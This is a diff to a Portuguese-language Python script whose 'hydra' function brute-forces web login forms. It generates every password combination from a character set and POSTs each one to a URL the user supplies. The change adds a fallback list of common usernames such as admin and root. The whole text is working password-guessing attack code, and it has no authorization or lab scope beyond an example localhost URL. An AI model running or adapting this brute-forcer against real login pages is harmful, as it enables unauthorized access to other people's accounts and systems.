@@ -27,25 +27,28 @@ def hydra():
     url = input("[+] URL do login (ex: http://localhost/login): ")
     campo_user = input("[+] Nome do campo de usuário (ex: username): ")
     campo_pass = input("[+] Nome do campo de senha (ex: password): ")
-    usuario = input("[+] Nome de usuário para testar: ")
+    usuario = input("[+] Nome de usuário para testar (deixe em branco para tentar lista): ").strip()
     falha_resposta = input("[+] Palavra que indica login falhou (ex: inválido): ").lower()
+
+    usuarios = [usuario] if usuario else ['admin', 'user', 'teste', 'root']
 
     print(Fore.YELLOW + "\n[*] Gerando e testando combinações...\n" + Style.RESET_ALL)
     tentativa = 0
-    for i in range(min_chars, max_chars + 1):
-        for combo in itertools.product(dicas, repeat=i):
-            senha = ''.join(combo)
-            data = {campo_user: usuario, campo_pass: senha}
-            try:
-                r = requests.post(url, data=data)
-                tentativa += 1
-                if falha_resposta not in r.text.lower():
-                    print(Fore.GREEN + f"\n[SENHA ENCONTRADA] {senha} após {tentativa} tentativas!" + Style.RESET_ALL)
-                    return
-                else:
-                    print(f"[X] Tentativa {tentativa}: {senha}")
-            except Exception as e:
-                print(Fore.RED + f"[ERRO] {e}" + Style.RESET_ALL)
+    for user in usuarios:
+        for i in range(min_chars, max_chars + 1):
+            for combo in itertools.product(dicas, repeat=i):
+                senha = ''.join(combo)
+                data = {campo_user: user, campo_pass: senha}
+                try:
+                    r = requests.post(url, data=data)
+                    tentativa += 1
+                    if falha_resposta not in r.text.lower():
+                        print(Fore.GREEN + f"\n[SENHA ENCONTRADA] Usuário: {user} | Senha: {senha} após {tentativa} tentativas!" + Style.RESET_ALL)
+                        return
+                    else:
+                        print(f"[X] Tentativa {tentativa}: {user} | {senha}")
+                except Exception as e:
+                    print(Fore.RED + f"[ERRO] {e}" + Style.RESET_ALL)
     print(Fore.RED + "\n[FIM] Nenhuma senha encontrada." + Style.RESET_ALL)
 
 def bot():
